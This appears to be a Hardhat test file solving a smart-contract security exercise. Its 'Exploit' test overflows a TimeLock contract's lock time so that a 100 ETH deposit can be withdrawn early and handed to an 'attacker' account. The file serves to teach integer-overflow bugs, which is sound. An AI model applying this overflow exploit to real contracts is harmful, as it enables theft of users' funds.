const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Arithmetic Over/Underflow Exercise 1", () => {
  let deployer, victim, attacker;
  let timelock, attackerInitialBalance;
  const ONE_MONTH = 30 * 24 * 60 * 60;
  const VICTIM_DEPOSIT = ethers.utils.parseEther("100");

  before(async () => {
    [deployer, victim, attacker] = await ethers.getSigners();
    attackerInitialBalance = await ethers.provider.getBalance(attacker.address);
    this.victimInitialBalance = await ethers.provider.getBalance(
      victim.address
    );

    const TimeLockFactory = await ethers.getContractFactory(
      "contracts/arithmetic-overflows-1/TimeLock.sol:TimeLock",
      deployer
    );
    timelock = await TimeLockFactory.deploy();

    await timelock.connect(victim).depositETH({ value: VICTIM_DEPOSIT });
    let currentBalance = await ethers.provider.getBalance(victim.address);
    expect(currentBalance).to.be.lt(
      this.victimInitialBalance.sub(VICTIM_DEPOSIT)
    );

    let block = await ethers.provider.getBlock(
      await ethers.provider.getBlockNumber()
    );
    let blockTimestmap = block.timestamp;

    let victimDeposited = await timelock
      .connect(victim)
      .getBalance(victim.address);
    let lockTime = await timelock.connect(victim).getLocktime(victim.address);

    expect(victimDeposited).to.equal(VICTIM_DEPOSIT);
  });

  it("Exploit", async function () {
    let currentLockTime = await timelock.getLocktime(victim.address);
    let timeToAdd = ethers.constants.MaxUint256.add(1).sub(currentLockTime);
    await timelock.connect(victim).increaseMyLockTime(timeToAdd);
    await timelock.connect(victim).withdrawETH();
    await victim.sendTransaction({
      to: attacker.address,
      value: VICTIM_DEPOSIT,
    });
  });

  after(async function () {
    // Timelock contract victim's balance supposed to be 0 (withdrawn successfuly)
    let victimDepositedAfter = await timelock
      .connect(victim)
      .getBalance(victim.address);
    expect(victimDepositedAfter).to.equal(0);

    // Attacker's should steal successfully the 100 ETH (-0.2 ETH becuase TX fees)
    let attackerCurrentBalance = await ethers.provider.getBalance(
      attacker.address
    );
    expect(attackerCurrentBalance).to.be.gt(
      attackerInitialBalance
        .add(VICTIM_DEPOSIT)
        .sub(ethers.utils.parseEther("0.2"))
    );
  });
});
